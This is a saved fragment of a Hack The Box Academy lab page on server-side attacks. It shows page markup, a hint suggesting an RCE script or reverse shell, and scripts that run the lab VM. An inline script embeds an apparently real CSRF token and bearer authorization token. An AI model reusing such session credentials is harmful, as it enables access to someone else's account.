+<div class="btn-group" role="group">
+<button style="display:none; cursor: default;" class=" extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="hint893" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="hint893" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center">
+<h5><i class="fad fa-life-ring text-success"></i>&nbsp; Hint</h5>
+<br>
+<h6>Use the provided script (rce function) or obtain a reverse shell through a Python one-liner.</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="cheatSheetModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="unlockModuleModal" aria-hidden="true">
+<div class="modal-dialog modal-lg">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center text-break">
+<h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
+<p>The cheat sheet is as a useful command reference for this module.</p>
+</div>
+</div>
+<div class="modal-footer">
+<a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/145">Download Cheatsheet</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<footer class="footer">
+<div class="container-fluid">
+<div class="row">
+<div class="col-sm-6">
+</div>
+<div class="col-sm-6">
+<div class="text-sm-right d-none d-sm-block">
+Powered by &nbsp; <a href="https://www.hackthebox.com/" target="_blank"><img style="margin-bottom: 1px;" src="./Server-side Attacks5_files/logo-htb.svg" height="20px"></a>
+</div>
+</div>
+</div>
+</div>
+</footer>
+</div>
+</div>
+</div>
+<script src="./Server-side Attacks5_files/jquery.min.js.download"></script>
+<script src="./Server-side Attacks5_files/bootstrap.bundle.min.js.download"></script>
+<script src="./Server-side Attacks5_files/metisMenu.min.js.download"></script>
+<script src="./Server-side Attacks5_files/simplebar.min.js.download"></script>
+<script src="./Server-side Attacks5_files/waves.min.js.download"></script>
+<script src="./Server-side Attacks5_files/toastr.min.js.download"></script>
+<script src="./Server-side Attacks5_files/axios.min.js.download"></script>
+<script src="./Server-side Attacks5_files/prism.js.download"></script>
+<script src="./Server-side Attacks5_files/main.js.download"></script>
+<script>
+    axios.defaults.headers.common = {
+        'X-CSRF-TOKEN': 'OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Authorization': 'Bearer ' + 'jgfghW9jOUxTYrPOMG9i2ujbtUFdtKuilcFrKtLWJpv9gAzKxNnjcsm7Dg2wIx8ivYvDBp7jCWD5XRNP'
+    };
+</script>
+<script>
+    $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');
+
+    $('.training-module a').attr('target','_blank').attr('rel','noopener nofollow');
+
+    $( ".favouriteBtn" ).click(function() {
+        let id = $(this).data('module-id');
+
+        axios.get('/api/modules/favourite/'+id).then(response => {
+            let data = response.data;
+            if (data.fav === 1) {
+                $(this).removeClass('far fa').addClass('fa');
+                toastr["success"](data.message, "Success");
+            } else {
+                $(this).removeClass('far fa').addClass('far');
+                toastr["success"](data.message, "Success");
+            }
+        });
+    });
+
+    function encode_utf8(string) {
+    return unescape(encodeURIComponent(string));
+  }
+
+  $('.btnAnswer').click(function() {
+    let question_id = $(this).data('question-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
+    axios.post('/api/check/answer', {
+      answer: btoa(utf8EncodedString),
+      question_id: question_id
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $('#answer' + question_id).attr('disabled', 1);
+        $('#answer' + question_id).addClass('text-success');
+        $('#hintBtn' + question_id).attr('disabled', 1);
+        toastr['success'](data.message, 'Success');
+        completeCheck();
+      }
+    });
+  });
+
+  $('.btnAnswerExercise').click(function() {
+    let exercise_id = $(this).data('exercise-id');
+    $(this).attr('disabled', 1);
+    let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
+    axios.post(`/api/check/exercise/${exercise_id}/answer`, {
+      answer: btoa(utf8EncodedString)
+    }).then(response => {
+      $(this).removeAttr('disabled');
+      let data = response.data;
+      if (data.success === 0) {
+        toastr['error'](data.message, 'Error');
+      } else {
+        $(this).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
+        $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
+        toastr['success'](data.message, 'Success');
+      }
+    });
+  });
+
+    
+    $('.reveal-modal').click(e => {
+        let id = $(e.target).data('exercise-id');
+        $(`#revealExerciseAnswer${id}`).modal('hide');
+    });
+
+    $( document ).ready(function() {
+
+        $('pre').filter(function () {
+            return this.className.match(/\blanguage-/);
+        }).each(function () {
+            let heading = $(this).prevAll().closest('h4').last().text();
+
+            if (this.className === ' language-shell-session') {
+                wrapTerminal(this, heading);
+            } else if (this.className === ' language-powershell-session') {
+                wrapPSTerminal(this, heading);
+            } else if (this.className === ' language-cmd-session') {
+                wrapCMDTerminal(this, heading);
+            } else if (this.className.startsWith(' language-')) {
+                var language = this.className.split('-').pop();
+                wrapCodeBlock(this,language);
+            }
+        });
+
+        wrapBrowser($('.website-screenshot'));
+        completeCheck();
+
+        $("span:contains('[!bash!]')").html('<span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span>');
+    });
+
+    function completeCheck()
+    {
+        axios.get('/api/check/complete/1298').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                if (data.completed === true) {
+                    $('#completeBtn').show();
+                }
+            }
+        });
+    }
+
+    function wrapTerminal(element, heading)
+    {
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapPSTerminal(element, heading)
+    {
+        $(element).css('background', '#012456').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCMDTerminal(element, heading)
+    {
+        $(element).css('background', 'black').children().css('color','white');
+        $(element).css('line-height', '0px');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">${heading}</span>
+                </div>
+            `);
+    }
+    function wrapCodeBlock(element,lang)
+    {
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend('<div class="window_top">Code: <span class="text-success">'+lang+'</div>');
+    }
+    function wrapBrowserOld(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+        let url = element.data('url');
+        $(element).wrap('<div class="window_content"></div>')
+            .parent().wrap('<div class="window_container"></div>')
+            .prepend(`
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <input type="text" class="website-screenshot-url" disabled value="${url}">
+                    <span class="float-right"><i class="fa fa-home"></i></span>
+                </div>
+            `);
+    }
+    function wrapBrowser(element)
+    {
+        $(element).css("border", "0px").css("border-radius","0");
+
+        $(element).each( function(index,e) {
+            let url = $(e).data('url');
+            $(e).wrap('<div class="window_content"></div>')
+                .parent().wrap('<div class="window_container"></div>')
+                .prepend(`
+                    <div class="window_top">
+                        <span class="mr-2">
+                            <i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
+                        </span>
+                        <input type="text" class="website-screenshot-url" disabled value="${url}">
+                        <span class="float-right"><i class="fa fa-bars"></i></span>
+                    </div>
+                `);
+        })
+    }
+</script>
+<script type="module">
+    import RFB from '/assets/libs/vnc/core/rfb.js';
+
+    let rfb;
+    let sidePreview;
+    let desktopName;
+    let pwnboxActive = false;
+
+    function connectedToServer(e) {
+        status("Connected to " + desktopName);
+        $('.fullScreenBtn').show();
+        $('.resetInstanceBtn').show();
+        $('.terminateInstanceBtn').show();
+        $('.extendInstanceBtn').show();
+        $('.instanceLoading').hide();
+        $('.instanceStart').hide();
+        $('.resetInstanceBtn').prop('disabled',false);
+        $('.fullScreenBtn').prop('disabled',false);
+        $('.extendInstanceBtn').prop('disabled',false);
+        $('.terminateInstanceBtn').prop('disabled',false);
+
+        document.querySelector('canvas').addEventListener('focus', (event) => {
+            navigator.clipboard.readText()
+                .then(text => {
+                    writeToClipboard(text);
+                })
+                .catch(err => {
+                    console.log('Something went wrong while accessing clipboard', err);
+                })
+        });
+
+    }
+
+    function disconnectedFromServer(e) {
+        status("Disconnected");
+        $('.screenPlaceholder').show();
+        stopCountdown();
+    }
+
+    function clipboardReceived(e) {
+        navigator.clipboard.writeText(e.detail.text)
+            .then(() => {
+                // Success!
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    }
+
+    function updateDesktopName(e) {
+        desktopName = e.detail.name;
+    }
+
+    function status(text) {
+        console.log(text);
+        $("#statusText").html(text);
+    }
+
+    function readQueryVariable(name) {
+        const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
+            match = document.location.href.match(re);
+
+        if (match) {
+            return decodeURIComponent(match[1]);
+        }
+
+        return null;
+    }
+
+    function writeToClipboard(text) {
+        rfb.clipboardPasteFrom(text);
+    }
+
+    let host = '';
+    let password = '';
+    let countdown = '';
+    let targetCountdown = '';
+    let url= '';
+    let spawnInterval = null;
+
+    function getPwnbox() {
+        axios.get('/api/get/pwnbox').then(response => {
+            let data = response.data;
+
+            if (spawnInterval !== null && data.instance.action_log !== null) {
+                let error = data.instance.action_log.find(log => log.error === true);
+                if (error) {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+
+                    clearInterval(spawnInterval);
+                    disconnectedFromServer();
+
+                    let errorMessage = `${error.text}. Please contact support.`;
+                    toastr["error"](errorMessage, "Error");
+
+                    status(errorMessage);
+                    return;
+                }
+            }
+
+            if (data.success === 1 && data.instance.vnc_password !== null) {
+                if (data.instance.action_log.find(log => log.action === 'ready')) {
+                    host = 'proxy-uk.htb-cloud.com/bird/' + data.instance.hostname;
+                    password = data.instance.vnc_password;
+                    $('.lifeLeft').html(data.instance.life_remaining);
+                    startCountdown();
+                    $('.screenPlaceholder').hide();
+                    url = 'https://vnc.htb-cloud.com/index.html?host=' + host + '&password=' + password;
+                    pwnboxActive = true;
+                    connect();
+
+                    if (spawnInterval !== null) {
+                        clearInterval(spawnInterval);
+                    }
+                }
+            } else {
+                $('.screenPlaceholder').show();
+            }
+
+        });
+    }
+
+        function extendPwnbox() {
+        axios.get('/api/extend/pwnbox').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                $('.lifeLeft').html(data.instance.life_remaining);
+                stopCountdown();
+                startCountdown();
+                toastr["success"]("Time extended for 60 minutes.", "Success");
+            } else {
+                toastr["error"](data.message, "Error");
+            }
+
+        });
+    }
+    
+    getPwnbox();
+
+    function startCountdown() {
+        countdown = setInterval(function() {
+            let life = parseInt($('.lifeLeft').html()) -1;
+            $('.lifeLeft').html(life)
+        }, 60 * 1000);
+    }
+
+    function stopCountdown() {
+        clearInterval(countdown);
+    }
+
+    function terminatePwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+
+        $('.instanceTerminating').show();
+
+        status('Terminating Interactive Instance...');
+
+        axios.delete('/api/terminate/pwnbox')
+            .then(({ data }) => {
+                if (data.success === 1) {
+                    $('.startInstanceBtn').show();
+                    $('.instanceStart').show();
+                    $('.instanceTerminating').hide();
+                    $('.resetInstanceBtn').hide();
+                    $('.terminateInstanceBtn').hide();
+                    $('.fullScreenBtn').hide();
+                    $('.extendInstanceBtn').hide();
+
+                    pwnboxActive = false;
+
+                    toastr['success']('Instance has been terminated.', 'Success');
+                } else {
+                    toastr['error'](data.message, 'Error');
+                    connect();
+                    $('.resetInstanceBtn').prop("disabled", false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                }
+            });
+    }
+
+    function startPwnbox() {
+        $('.resetInstanceBtn').prop('disabled',true);
+        $('.fullScreenBtn').prop('disabled',true);
+        $('.extendInstanceBtn').prop('disabled',true);
+        $('.terminateInstanceBtn').prop('disabled',true);
+        $('.instanceStart').hide();
+        $('.instanceLoading').show();
+        $('.startInstanceBtn').hide();
+
+        status("Starting Interactive Instance...");
+
+        grecaptcha.ready(function() {
+            grecaptcha.execute('6LeI6LsaAAAAAKgdStgBC6B4UVbXlpYNaYGN46Ah', {action: 'spawnPwnbox'}).then(function(token) {
+                if (token) {
+                    axios.get('/api/spawn/pwnbox?g-recaptcha-response= '+token).then(response => {
+                        let data = response.data;
+                        if (data.success === 1) {
+                            spawnInterval = setInterval(() => {
+                                getPwnbox();
+                            }, 2000);
+                        } else {
+                            if(data.code === 1 || (data.code === 3 && pwnboxActive)) {
+                                $('.resetInstanceBtn').prop("disabled", false);
+                                $('.fullScreenBtn').prop('disabled',false);
+                                $('.extendInstanceBtn').prop('disabled',false);
+                                $('.terminateInstanceBtn').prop('disabled',false);
+                                connect();
+
+                                if (data.code === 3) {
+                                    $('.instanceLoading').hide();
+                                    startCountdown();
+                                }
+                            } else {
+                                $('.startInstanceBtn').show();
+                                $('.instanceStart').show();
+                                $('.instanceLoading').hide();
+                            }
+
+                            toastr["error"](data.message, "Error");
+                        }
+
+                    });
+                } else {
+                    $('.resetInstanceBtn').prop('disabled',false);
+                    $('.fullScreenBtn').prop('disabled',false);
+                    $('.extendInstanceBtn').prop('disabled',false);
+                    $('.terminateInstanceBtn').prop('disabled',false);
+                    $('.instanceStart').show();
+                    $('.instanceLoading').hide();
+                    $('.startInstanceBtn').show();
+                }
+            });
+        });
+    }
+
+    $('.fullScreenBtn').click(function() {
+        window.open(url, "_blank");
+    });
+
+    $('.startInstanceBtn').click(function() {
+        startPwnbox();
+            });
+
+    $('.resetInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                rfb.disconnect();
+                sidePreview.disconnect();
+        startPwnbox();
+    });
+
+    $('.terminateInstanceBtn').click(function() {
+        $('.screenPlaceholder').show();
+        $('.instanceStart').show();
+                rfb.disconnect();
+                sidePreview.disconnect();
+        terminatePwnbox();
+    });
+
+    $('.extendInstanceBtnClicker').click(function() {
+       extendPwnbox();
+    });
+
+    $('.resetTargetBtn').click(function(){
+        $(this).prop('disabled',true);
+                            spawnVMs();
+            });
+
+    function connect() {
+        status("Connecting to " + host.split('/')[2] + "...");
+
+                rfb = new RFB(document.getElementById('screen'), 'wss://' + host,
+            { credentials: { password: password } });
+        //Listeners
+        rfb.addEventListener("desktopname", updateDesktopName);
+        rfb.addEventListener("clipboard",clipboardReceived);
+
+        rfb.resizeSession = true;
+        rfb.viewOnly = false;
+        
+        sidePreview = new RFB(document.getElementById('sidePreview'), 'wss://' + host,
+            { credentials: { password: password } });
+
+        sidePreview.addEventListener("connect",  connectedToServer);
+        sidePreview.addEventListener("disconnect", disconnectedFromServer);
+
+        sidePreview.resizeSession = false;
+        sidePreview.viewOnly = true;
+        sidePreview.scaleViewport = true;
+    }
+
+    $('.target, .targetIp').click(e => {
+        if ($('.resetTargetBtn').is(':hidden')) return;
+        navigator.clipboard.writeText($(e.target).html())
+            .then(() => {
+                toastr['success']('Target copied to clipboard', 'Success');
+            })
+            .catch(err => {
+                console.log('Something went wrong while copying to clipboard.', err);
+            });
+    });
+
+            $('.spawnTargetBtn').click(function() {
+        spawnVMs();
+    })
+
+    let vmCheckTimer;
+
+    function spawnVMs() {
+        $('.target').html('<i class="fad fa-circle-notch fa-spin"></i> Target is spawning...');
+        $('.targetIp').html('<i class="fad fa-circle-notch fa-spin"></i>');
+        axios.get('/api/spawn/vms/1298').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                vmCheckTimer = setInterval(function() {
+                    checkVMs();
+                }, 5 * 1000);
+            } else {
+                toastr["error"](data.message, "Error");
+                $('.target').html('<span class="spawnTargetBtn" style="cursor:pointer;">Click here to spawn the target system!</span>');
+            }
+        });
+    }
+
+    function checkVMs() {
+        axios.get('/api/get/vms/1298').then(response => {
+            let data = response.data;
+            if (data.success === 1) {
+                if (data.ready === 1) {
+                    $('.target').html(data.ip);
+                    $('.resetTargetBtn').show();
+                    $('.targetIp').html(data.ip);
+                    $('.targetLifeTimeContainer').show();
+                    $('.targetLifeTime').html(data.life_remaining);
+                    clearInterval(vmCheckTimer);
+                    $('.resetTargetBtn').prop('disabled',false);
+                    startTargetCountdown();
+                }
+            }
+        });
+    }
+
+    checkVMs();
+
+    
+    function startTargetCountdown() {
+        targetCountdown = setInterval(function() {
+            let life = parseInt($('.targetLifeTime').html()) -1;
+            $('.targetLifeTime').html(life)
+            if (life == 0) {
+                $('.targetLifeTimeContainer').hide();
+            }
+        }, 60 * 1000);
+    }
+</script>
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./Server-side Attacks5_files/anchor.html" width="256" height="60" role="presentation" name="a-3p1i0s4odtq" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./Server-side Attacks5_files/saved_resource.html"></iframe></div><div id="torrent-scanner-popup" style="display: none;"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./Server-side Attacks5_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32"><path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg viewBox="0 0 16 14" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z"></path></svg></div></div><style id="intercom-lightweight-app-style" type="text/css">
+  @keyframes intercom-lightweight-app-launcher {
+    from {
+      opacity: 0;
+      transform: scale(0.5);
+    }
+    to {
+      opacity: 1;
+      transform: scale(1);
+    }
+  }
+
+  @keyframes intercom-lightweight-app-gradient {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+
+  @keyframes intercom-lightweight-app-messenger {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .intercom-lightweight-app {
+    position: fixed;
+    z-index: 2147483001;
+    width: 0;
+    height: 0;
+    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
+  }
+
+  .intercom-lightweight-app-gradient {
+    position: fixed;
+    z-index: 2147483002;
+    width: 500px;
+    height: 500px;
+    bottom: 0;
+    right: 0;
+    pointer-events: none;
+    background: radial-gradient(
+      ellipse at bottom right,
+      rgba(29, 39, 54, 0.16) 0%,
+      rgba(29, 39, 54, 0) 72%);
+    animation: intercom-lightweight-app-gradient 200ms ease-out;
+  }
+
+  .intercom-lightweight-app-launcher {
+    position: fixed;
+    z-index: 2147483003;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #85C700;
+    cursor: pointer;
+    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
+    animation: intercom-lightweight-app-launcher 250ms ease;
+  }
+
+  .intercom-lightweight-app-launcher:focus {
+    outline: none;
+    
+  }
+
+  .intercom-lightweight-app-launcher-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 60px;
+    height: 60px;
+    transition: transform 100ms linear, opacity 80ms linear;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg {
+    width: 28px;
+    height: 32px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg {
+    height: 56px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-custom-icon-open {
+    max-height: 36px;
+    max-width: 36px;
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize {
+    
+        opacity: 0;
+        transform: rotate(-60deg) scale(0);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg {
+    width: 16px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-messenger {
+    position: fixed;
+    z-index: 2147483003;
+    overflow: hidden;
+    background-color: white;
+    animation: intercom-lightweight-app-messenger 250ms ease-out;
+    
+        width: 376px;
+        height: calc(100% - 120px);
+        max-height: 704px;
+        min-height: 250px;
+        right: 20px;
+        bottom: 100px;
+        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
+        border-radius: 8px;
+      
+  }
+
+  .intercom-lightweight-app-messenger-header {
+    height: 75px;
+    background: linear-gradient(
+      135deg,
+      rgb(17, 25, 39) 0%,
+      rgb(0, 0, 0) 100%
+    );
+  }
+
+  @media print {
+    .intercom-lightweight-app {
+      display: none;
+    }
+  }
+</style></div><img src="./Server-side Attacks5_files/adsct" height="1" width="1" style="display: none;"><img src="./Server-side Attacks5_files/adsct(1)" height="1" width="1" style="display: none;"></body></html>
